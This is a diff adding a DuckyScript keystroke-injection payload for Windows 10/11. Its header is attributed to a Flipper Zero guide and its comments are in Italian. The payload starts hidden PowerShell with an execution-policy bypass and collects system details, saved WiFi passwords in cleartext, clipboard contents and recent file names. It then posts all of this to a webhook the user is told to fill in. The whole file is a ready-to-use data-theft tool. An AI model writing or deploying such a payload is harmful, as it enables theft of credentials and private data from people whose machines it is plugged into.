@@ -1,0 +1,19 @@
+REM ============================================================
+REM Title:    Data Exfiltration to Webhook
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Exfiltration
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~10 secondi
+REM Detect:   Medio - HTTPS POST verso webhook
+REM Desc:     Raccoglie system info, WiFi profiles, clipboard,
+REM           file recenti e li invia ad un webhook Discord/custom.
+REM CHANGE:   WEBHOOK_URL con il tuo webhook
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$d=@{};$d['hostname']=$env:COMPUTERNAME;$d['user']=$env:USERNAME;$d['domain']=$env:USERDOMAIN;$d['ip']=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.InterfaceAlias -notmatch 'Loopback'}|Select-Object -First 1).IPAddress;$d['os']=(Get-CimInstance Win32_OperatingSystem).Caption;$d['wifi']='';try{(netsh wlan show profiles)|Select-String ':\s+(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=((netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\s+:\s+(.+)$');if($p){$d['wifi']+=$n+':'+$p.Matches.Groups[1].Value.Trim()+';'}}}catch{};$d['clipboard']=Get-Clipboard -ErrorAction SilentlyContinue;$d['recent']=(Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -ErrorAction SilentlyContinue|Select-Object -First 20|%{$_.Name})-join',';$body=@{content='``````json'+\"`n\"+(ConvertTo-Json $d)+'``````'}|ConvertTo-Json -Depth 3;Invoke-RestMethod -Uri 'WEBHOOK_URL' -Method Post -Body $body -ContentType 'application/json'"
+ENTER
